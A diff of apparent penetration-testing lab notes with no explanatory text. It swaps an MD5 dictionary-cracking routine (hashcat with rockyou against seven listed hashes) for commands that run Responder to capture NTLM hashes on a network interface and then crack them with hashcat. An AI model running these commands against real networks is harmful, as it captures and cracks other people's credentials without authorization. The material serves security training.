@@ -1,27 +1,8 @@
-cat << EOF > target_hashes.txt
-dc647eb65e6711e155375218212b3964
-eb61eead90e3b899c6bcbe27ac581660
-958152288f2d2303ae045cffc43a02cd
-2c9341ca4cf3d87b9e4eb905d6a3ec45
-75b71aa6842e450f12aca00fdf54c51d
-031cbcccd3ba6bd4d1556330995b8d08
-b5af0b804ff7238bce48adef1e0c213f
-EOF
 
+responder -h
 
-hashcat -h | more
+responder -I eth0 -A
 
+responder -I eth0
 
-sudo su -
-
-
-cd /usr/share/wordlists
-
-
-gunzip rockyou.txt.gz
-
-
-cd
-
-
-hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 -a 0 ntlm-hash.txt /usr/share/wordlists/nmap.lst -O
